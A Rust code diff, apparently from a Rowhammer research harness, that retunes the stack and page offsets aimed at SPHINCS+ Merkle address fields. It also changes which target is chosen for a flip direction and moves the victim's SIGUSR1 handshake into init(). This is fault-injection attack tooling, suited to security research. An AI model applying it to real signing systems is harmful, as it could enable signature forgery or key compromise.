@@ -102,7 +102,7 @@ pub const TARGET_OFFSET_DUMMY: TargetOffset = TargetOffset {
 
 const SPX_N: usize = 32;
 
-const STACK_BASE: usize = 0x630;
+const STACK_BASE: usize = 0x570;
 const STACK_OFFSET: usize = 32;
 
 // Target offsets for shake-256s WITH memutils printing enabled
@@ -175,7 +175,7 @@ pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 10] = [
     TargetOffset {
         id: 8,
         description: "merkle leaf_addr",
-        page_offset: 0x868,
+        page_offset: 0x7c8,
         stack_offset: 32,
         target_size: 22,
         flip_direction: FlipDirection::ZeroToOne,
@@ -183,7 +183,7 @@ pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 10] = [
     TargetOffset {
         id: 9,
         description: "merkle pk_addr",
-        page_offset: 0x888,
+        page_offset: 0x7e8,
         stack_offset: 32,
         target_size: 22,
         flip_direction: FlipDirection::ZeroToOne,
@@ -200,7 +200,7 @@ impl SphincsPlus {
             let target = if flip.flip_direction() == FlipDirection::ZeroToOne {
                 TARGET_OFFSETS_SHAKE_256S[9].clone()
             } else {
-                TARGET_OFFSETS_SHAKE_256S[7].clone()
+                TARGET_OFFSETS_SHAKE_256S[5].clone()
             };
             assert_eq!(flip.flip_direction(), target.flip_direction); // sanity check for our target selection, I'm becoming quite paranoid of
             let (env, page_overflow) = make_env_for(flip.addr, target.page_offset);
@@ -280,6 +280,7 @@ impl HammerVictim for SphincsPlus {
                 let mut cmd = std::process::Command::new(binary);
                 cmd.arg(KEYS_FILE);
                 cmd.arg(injection_config.id.to_string());
+                //cmd.arg(injection_config.target_addr.to_string());
                 cmd.stdin(std::process::Stdio::piped());
                 cmd.stdout(std::process::Stdio::piped());
                 cmd.stderr(std::process::Stdio::piped());
@@ -351,20 +352,24 @@ impl HammerVictim for SphincsPlus {
             _ => Err(HammerVictimError::NotRunning),
         }
     }
-    fn init(&mut self) {}
+    fn init(&mut self) {
+        match &mut self.state {
+            State::Running { child, .. } => {
+                // wait for "SIGUSR1" via victim stdout
+                debug!("Waiting for SIGUSR1 msg from victim");
+                let msg = child.read_line().expect("read_line");
+                if msg != "SIGUSR1" {
+                    panic!("Expected SIGUSR1, got '{msg}'");
+                }
+            }
+            _ => panic!("Victim not running"),
+        }
+    }
 
     fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
         self.check_flippy_page_exists()?;
         match &mut self.state {
             State::Running { child, .. } => {
-                // wait for "SIGUSR1" via victim stdout
-                debug!("Waiting for SIGUSR1 msg from victim");
-                let msg = child.read_line()?;
-                if msg != "SIGUSR1" {
-                    return Err(HammerVictimError::ProtocolError(format!(
-                        "Expected SIGUSR1, got {msg}"
-                    )));
-                }
                 thread::sleep(Duration::from_millis(1));
                 // resume the victim
                 debug!("Sending SIGUSR1 to victim");
@@ -379,6 +384,7 @@ impl HammerVictim for SphincsPlus {
                     "a2dc0903dbbf54dfaeec7475438864b8fa0b22f6fe9d0aa3d91faf5b323abde5", // sphincs+ sig
                     "dd4e6730520932767ec0a9e33fe19c4ce24399d6eba4ff62f13013c9ed30ef87", // dummy 4096 bytes of 0xaa (python3 -c "print('aa' * 4096, end='')" | shasum -a 256)
                     "12d0401ec5e681b3da36c7654381c418e671fb288fe320893f0efeb021df2582", // dummy 4096 bytes of 0x55 (python3 -c "print('55' * 2048, end='')" | shasum -a 256)
+                    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", // empty string
                 ];
                 let mut hasher = Sha256::new();
                 hasher.update(signature.as_bytes());
